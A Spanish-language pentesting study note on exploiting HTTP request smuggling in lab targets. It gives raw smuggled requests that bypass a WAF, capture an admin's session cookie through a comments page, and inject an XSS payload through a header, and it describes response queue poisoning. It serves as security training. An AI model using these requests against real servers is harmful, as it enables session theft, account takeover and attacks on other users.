---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - HTTP/Request-Smuggling
Fecha de actualización: 2026-07-14
Nota previa: "[[10 - Software vulnerable a smuggling]]"
Nota siguiente: "[[12 - Herramientas y prevención de Request Smuggling]]"
Area: "[[HTTP Attacks.base|HTTP Attacks]]"
---
---

Confirmada una desync (CL.TE/TE.CL/TE.TE), esta nota reúne **qué se hace con ella**. El impacto es alto y variado: <mark style="background: #FFB86CA6;">bypass de WAF, forzar acciones autenticadas, **capturar los datos de otros usuarios**, robar sesiones (ATO) y XSS reflejado masivo</mark>.

# 1. Bypass de controles de seguridad (WAF)

Ya visto en [[09 - TE.CL|TE.CL]]: un WAF que bloquea rutas (`/internal/`, `admin`) o puntúa maliciosidad inspecciona lo que **cree** que es la petición. Escondiendo la petición prohibida en el cuerpo, el WAF no la ve pero el servidor la procesa.

```http
POST / HTTP/1.1
Host: vuln.htb
Content-Length: 64
Transfer-Encoding: chunked

0

POST /internal/index.php HTTP/1.1
Host: localhost
Dummy: 
```

# 2. Capturar la petición de la víctima (robo de sesión)

La primitiva más devastadora: <mark style="background: #FFB86CA6;">forzar a la víctima a **enviar su propia petición a un sitio que tú puedes leer**</mark>. Si la app tiene una función de comentarios públicos, se smuggle un `POST /comments.php` cuyo cuerpo **absorbe** la petición de la víctima —cookie incluida— y la publica como comentario:

```http
POST / HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Transfer-Encoding: chunked

0

POST /comments.php HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

name=hacker&comment=test
```

Cuando el admin hace una petición benigna, el servidor la ve **anexada al parámetro `comment`**:

```http
name=hacker&comment=testGET / HTTP/1.1
Host: stealingdata.htb
Cookie: sess=<admin_session_cookie>   ← se publica como parte del comentario
```

Refrescando `/comments.php` aparece la <mark style="background: #FF5582A6;">cookie de sesión del admin</mark> publicada. La robas y accedes al panel.

> [!warning] Ajustar el `Content-Length` de captura
> El `CL` de la petición smuggled (`300`) es el parámetro crítico:
> - **Demasiado pequeño** → capturas poco de la petición de la víctima (quizá no llega la cookie).
> - **Demasiado grande** → supera la petición de la víctima entera y el servidor <mark style="background: #FFB8EBA6;">espera más datos y hace **timeout**</mark>, no recibes nada.
>
> Se ajusta por **trial-and-error**. Y si la acción smuggled es autenticada, añade **tu** cookie en el `Cookie` de la petición smuggled.

# 3. XSS reflejado masivo (sin interacción)

Como el [[01 - Introducción a Web Cache Poisoning|cache poisoning]], el smuggling weaponiza un XSS reflejado **sin interacción** de la víctima, e incluso uno que era **inexplotable** — por ejemplo un XSS en una **cabecera** (`Host`, `Vuln`), que normalmente no puedes forzar en el navegador de la víctima. Con smuggling **sí** inyectas cabeceras en su petición:

```http
POST / HTTP/1.1
Host: vuln.htb
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Vuln: "><script>alert(1)</script>
Dummy: 
```

La petición de la víctima adquiere la cabecera `Vuln` con el payload → su respuesta contiene el XSS → ejecuta en su navegador.

> [!info] Vector moderno: Response Queue Poisoning
> Un impacto más allá de HTB: si la desync deja el número de respuestas descompensado, <mark style="background: #8000E1A6;">las respuestas se **desplazan** en la cola</mark> y empiezas a recibir la respuesta destinada a **otro usuario** (con sus datos, su cookie en un `Set-Cookie`, su contenido privado). Se conoce como *response queue poisoning* / *desync-powered response manipulation* (Kettle). Es un robo de datos masivo y persistente mientras dure la conexión envenenada.

> [!important] Resumen de primitivas
> | Objetivo | Cómo |
> | - | - |
> | Bypass de WAF/acceso | Esconder la ruta prohibida en el cuerpo |
> | Acción con sesión ajena | Smuggle una acción; la cookie de la víctima la autentica |
> | Robar sesión/datos | Capturar la petición de la víctima en un lugar legible |
> | XSS masivo | Inyectar el payload en la petición/cabecera de la víctima |
> | Robo masivo | Response queue poisoning |

Las herramientas que automatizan detección y explotación, y la prevención, en [[12 - Herramientas y prevención de Request Smuggling]].

## Referencias

- [PortSwigger — Exploiting HTTP request smuggling](https://portswigger.net/web-security/request-smuggling/exploiting)
- [James Kettle — Response queue poisoning](https://portswigger.net/research/http-desync-attacks-what-happened-next)
